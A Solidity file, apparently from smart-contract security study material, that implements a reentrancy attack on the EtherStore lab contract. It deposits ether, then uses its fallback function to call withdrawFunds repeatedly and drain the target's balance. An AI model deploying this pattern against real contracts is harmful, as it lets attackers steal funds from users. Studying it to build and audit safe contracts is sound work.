// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "contracts/Reentrancy/EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // 계약자 주소(공격 대상)로 etherStore 변수를 초기화
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    } 

    //공격 함수
    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);
        //계약자 주소(공격대상)에 1이더를 임금
        etherStore.depositFunds{ value: 1 ether}();
        //출금함수 호출
        etherStore.withdrawFunds(1 ether);
    }
    uint256 balance = payable(address(this)).balance;
    function collectEther() public {
        msg.sender.transfer(payable(address(this)).balance);
    }

    //fallback function(종료시 호출)
    fallback() payable external{
        //계약자 주소(공격 대상)에 이더가 있을 경우 다시 출금 함수를 호출
        if(address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

}